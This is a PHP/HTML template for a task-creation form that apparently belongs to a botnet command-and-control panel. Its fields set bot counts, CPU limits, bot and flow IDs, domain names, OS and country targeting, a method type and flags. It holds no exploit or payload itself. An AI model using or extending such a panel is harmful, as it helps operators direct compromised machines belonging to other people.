<script>
    var bots_count_value = <?php echo $settings['total_bots']?>;
    var ion_from = 1;
    var ion_to = <?php echo $tasks_settings['total_bots_cpu'];?>;
</script>

<div class="row text-right" style="margin-bottom: 10px;margin-top: 5px;">
    <button data-toggle="modal" data-target="#form_modal" type="button" class="btn btn-default">Add new task</button>
</div>

<div class="row" data-tasks-list>
</div>

<div id="form_modal" class="modal fade" tabindex="-1" role="dialog">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
                <h5 class="modal-title">Task's Settings</h5>
            </div>

            <!-- Form inside modal -->
            <form role="form" action="#">
                <div class="modal-body has-padding">
                    <div class="form-group">
                        <label>Bots count</label>
                        <input id="bots" class="form-control" placeholder="Enter bots count or 0 for infinity...">
                        <!--<input class="range" type="range" data-grid="false" data-maximum="<?php /*echo $settings['total_bots']*/?>;" id="bots">-->
                    </div>
                    <div class="form-group">
                        <label>CPU</label>
                        <input id="cpu" class="form-control" placeholder="Enter cpu with format <min;max> or 0 for infinity">
                        <!--<input class="range" type="range" data-type="double" data-grid="false" data-max="<?php /*echo $tasks_settings['total_bots_cpu'];*/?>" data-from="<?php /*echo intval($tasks_settings['total_bots_cpu'] / 2); */?>" id="cpu">-->
                    </div>
                    <div class="form-group">
                        <label>Bot IDs</label>
                        <input id="bot-ids" class="form-control" placeholder="Enter bot IDs...">
                    </div>
                    <div class="form-group">
                        <label>Flow IDs</label>
                        <input id="flows" class="form-control" placeholder="Enter flow IDs...">
                    </div>
                    <div class="form-group">
                        <label>Domain names</label>
                        <input id="domain-names" class="form-control" placeholder="Enter domain names...">
                    </div>
                    <div class="form-group">
                        <div class="checkbox">
                            <label>
                                <input type="checkbox" id="use_os">
                                OS selection
                            </label>
                        </div>
                    </div>
                    <div class="form-group" id="os_block">
                        <label>Operation Systems</label>
                        <div class="input-group s2-multiselect">
                            <span class="input-group-btn" for="os"><button class="btn btn-default btn-lg unselect_all"  type="button">Clear</button></span>
                            <select class="select2-container select2-container-multi select-multiple" data-placeholder="Choose OS..." multiple id="os" style="width: 100%; display: none;">
                                <?php
                                echo $tasks_settings['select_os'];
                                ?>
                            </select>
                            <span for="os" class="input-group-btn"><button class="btn btn-default btn-lg select_all"  type="button">All</button></span>
                        </div>
                    </div>
                    <div class="form-group">
                        <div class="checkbox">
                            <label>
                                <input type="checkbox" id="use_countries">
                                Country selection
                            </label>
                        </div>
                    </div>
                    <div class="form-group" id="country_block">
                        <label>Countries</label>
                        <div class="input-group s2-multiselect">
                            <span class="input-group-btn" for="countries"><button class="btn btn-default btn-lg unselect_all"  type="button">Clear</button></span>
                            <select class="select2-container select2-container-multi select-multiple" data-placeholder="Choose countries..." multiple id="countries" style="width: 100%; display: none;">
                                <?php
                                echo $tasks_settings['select_country'];
                                ?>
                            </select>
                            <span for="countries" class="input-group-btn"><button class="btn btn-default btn-lg select_all"  type="button">All</button></span>
                        </div>
                    </div>
                    <div class="form-group">
                        <label>Method type</label>
                        <select data-placeholder="Choose a method..." class="select-full select2-offscreen" tabindex="-1" id="method">
                            <?php
                            echo $tasks_settings['select_type'];
                            ?>
                        </select>
                    </div>
                    <div class="form-group">
                        <label>Context</label>
                        <textarea id="context" rows="5" cols="5" class="form-control" style="resize: vertical; min-height: 100px;" placeholder="Enter context..."></textarea>
                    </div>
                    <div class="form-group">
                        <label>Flags</label>
                        <input id="flags" class="form-control" placeholder="Enter flags...">
                    </div>
                </div>
                <div class="modal-footer">
                    <div class="text-right">
                        <input id="create_task" type="submit" value="Create task" class="btn btn-default">
                        <!--<input type="reset" value="Reset form" class="btn btn-danger">-->
                    </div>
                </div>
            </form>
        </div>
    </div>
</div>